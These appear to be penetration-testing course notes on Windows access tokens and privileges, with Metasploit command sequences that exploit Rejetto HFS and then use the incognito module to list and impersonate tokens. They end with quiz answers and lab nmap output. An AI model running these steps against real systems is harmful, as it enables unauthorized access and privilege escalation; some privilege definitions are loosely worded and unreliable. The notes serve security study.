
#### Windows Access Token
- Core element of authentication
- Managed by Local Security Authority Subsystem Service
- Temp key for a process to identify it's authorization
- Generated by winlogon.exe process
- Token is attached to userinit.exe to allow the user to use applications under that tokens authentication rules
- Impersonate Access Token - Logged on via domain or system services 
- Delegate Token - Used by winlogin or RDP 

#### Windows Privileges
-  SeAssignPrimaryToken - Allows user to create impersonat Tokens
- SeCreateToken - Create an arbitrary token with privileges
- SeImpersonatPrivilege - A child process is created under a parent process that has admin privileges or an elevated token in use

#### Incognito Module
- built in meterpreter module
- can impersonate token post exploitation

Setup msfconsole
```
service postgresql start && msfconsole
workspace -a impersonate
setg RHOSTS <remote_host>
setg LHOST <local_host>
setg RHOST <remote_host>
```

Scan and Enumerate target
```
db_nmap -sV -O <target_ip>
```

Setup exploit module
```
search rejetto
use exploit/windows/http/rejetto_hfs_exec
exploit
```

Check what privs the current user has
```
getprivs
```

Setup incognito
```
load incognito
list_tokens -u 
impersonate_token "<token_name>"
migrate <process_a_user_initialized>
```


## Quiz

Impersonate tokens are created as a direct result of an interactive login on Windows

	FALSE

Which one of the following meterpreter commands can be used to list the available access tokens for impersonation?

	list_tokens -u

Windows Access Tokens are generated by the winlogon.exe process.

	TRUE
## Lab

```
10.10.80.3
10.4.21.196
```

```
db_nmap -sV -O 10.4.21.196
80/tcp   open  http          HttpFileServer httpd 2.3
```

```

```